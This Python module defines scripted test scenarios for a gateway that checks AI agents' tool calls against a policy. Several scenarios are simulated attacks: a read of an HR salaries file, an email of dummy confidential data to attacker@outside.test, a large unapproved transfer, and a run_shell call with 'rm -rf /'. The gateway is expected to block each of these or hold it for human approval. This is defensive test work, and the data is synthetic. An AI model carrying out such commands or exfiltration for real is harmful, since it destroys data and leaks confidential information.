"""Predefined attack and legitimate-use simulations. Synthetic data only."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from sentinelflow.gateway import GatewayResult, SentinelGateway, execute_proposed_action
from sentinelflow.policy import Decision


@dataclass(frozen=True)
class Scenario:
    """One scripted request plus the security outcome we expect."""

    scenario_id: str
    title: str
    explanation: str
    action: str
    arguments: Any
    agent_id: str
    expected_decision: Decision
    expected_executed: bool
    expected_rule_id: str


# Six required simulations. All names and contents are fake.
SCENARIOS: tuple[Scenario, ...] = (
    Scenario(
        scenario_id="legit-read-permitted-file",
        title="Legitimate read of a permitted dummy file",
        explanation=(
            "docs_agent is allowed to read under /workspace/docs, so the "
            "mock file is returned."
        ),
        action="read_file",
        arguments={"path": "/workspace/docs/readme.md"},
        agent_id="docs_agent",
        expected_decision=Decision.ALLOW,
        expected_executed=True,
        expected_rule_id="ALLOW_READ_FILE",
    ),
    Scenario(
        scenario_id="attack-read-restricted-file",
        title="Attempt to read a restricted dummy file",
        explanation=(
            "The salaries file lives outside the agent's allowed prefix, "
            "so the engine blocks and the mock never runs."
        ),
        action="read_file",
        arguments={"path": "/workspace/hr/salaries.txt"},
        agent_id="docs_agent",
        expected_decision=Decision.BLOCK,
        expected_executed=False,
        expected_rule_id="DENY_PATH_NOT_ALLOWED",
    ),
    Scenario(
        scenario_id="attack-email-confidential-external",
        title="Attempt to email dummy confidential notes off-domain",
        explanation=(
            "The body is synthetic confidential text. An external recipient "
            "requires a human, so the mock mailbox stays empty."
        ),
        action="send_email",
        arguments={
            "to": "attacker@outside.test",
            "subject": "Dummy notes",
            "body": (
                "SYNTHETIC CONFIDENTIAL: dummy badge numbers D-1001, D-1002. "
                "This is not real personal data."
            ),
        },
        agent_id="mail_agent",
        expected_decision=Decision.REQUIRE_APPROVAL,
        expected_executed=False,
        expected_rule_id="APPROVE_EXTERNAL_EMAIL",
    ),
    Scenario(
        scenario_id="attack-delete-protected-file",
        title="Attempt to delete a protected dummy file",
        explanation=(
            "ops_agent may only delete under /workspace/tmp. A docs path is "
            "blocked; the dummy file is not marked deleted."
        ),
        action="delete_file",
        arguments={"path": "/workspace/docs/readme.md"},
        agent_id="ops_agent",
        expected_decision=Decision.BLOCK,
        expected_executed=False,
        expected_rule_id="DENY_PATH_NOT_ALLOWED",
    ),
    Scenario(
        scenario_id="attack-transfer-without-approval",
        title="Attempt to transfer funds that need approval",
        explanation=(
            "2500 is above the 1000 threshold, so the ledger mock must not "
            "post until a human approves."
        ),
        action="transfer_funds",
        arguments={"amount": 2500.0, "to_account": "ACC-SYNTH-999"},
        agent_id="finance_agent",
        expected_decision=Decision.REQUIRE_APPROVAL,
        expected_executed=False,
        expected_rule_id="APPROVE_LARGE_TRANSFER",
    ),
    Scenario(
        scenario_id="attack-unknown-tool-malformed",
        title="Unknown tool with malformed arguments",
        explanation=(
            "A non-mapping argument list is rejected before any tool table "
            "lookup. Unknown names are also blocked by default."
        ),
        action="run_shell",
        arguments=["rm", "-rf", "/"],  # type: ignore[arg-type]
        agent_id="docs_agent",
        expected_decision=Decision.BLOCK,
        expected_executed=False,
        expected_rule_id="DENY_MALFORMED_REQUEST",
    ),
)


def run_scenario(
    scenario: Scenario,
    gateway: SentinelGateway | None = None,
) -> GatewayResult:
    """Send one scenario through the real backend pipeline."""

    return execute_proposed_action(
        scenario.action,
        scenario.arguments,
        scenario.agent_id,
        gateway=gateway,
    )


def scenario_matches(scenario: Scenario, result: GatewayResult) -> bool:
    """True if the live result matches the scripted expectation."""

    return (
        result.policy.decision is scenario.expected_decision
        and result.executed is scenario.expected_executed
        and result.policy.rule_id == scenario.expected_rule_id
    )


def run_all_scenarios(
    gateway: SentinelGateway | None = None,
) -> list[tuple[Scenario, GatewayResult, bool]]:
    """Run every scenario on one gateway (shared mock state and audit log)."""

    runner = gateway if gateway is not None else SentinelGateway()
    rows: list[tuple[Scenario, GatewayResult, bool]] = []
    for scenario in SCENARIOS:
        result = run_scenario(scenario, gateway=runner)
        rows.append((scenario, result, scenario_matches(scenario, result)))
    return rows


def main() -> None:
    """Print each scenario. Run with: python -m sentinelflow.scenarios"""

    print("SentinelFlow attack simulations (synthetic data only)\n")
    for scenario, result, ok in run_all_scenarios():
        status = "PASS" if ok else "FAIL"
        print(f"[{status}] {scenario.scenario_id}")
        print(f"      {scenario.title}")
        print(f"      expected: {scenario.expected_decision.value} / {scenario.expected_rule_id}")
        print(
            f"      actual:   {result.policy.decision.value} / "
            f"{result.policy.rule_id} / executed={result.executed}"
        )
        print(f"      why:      {scenario.explanation}")
        print()


if __name__ == "__main__":
    main()
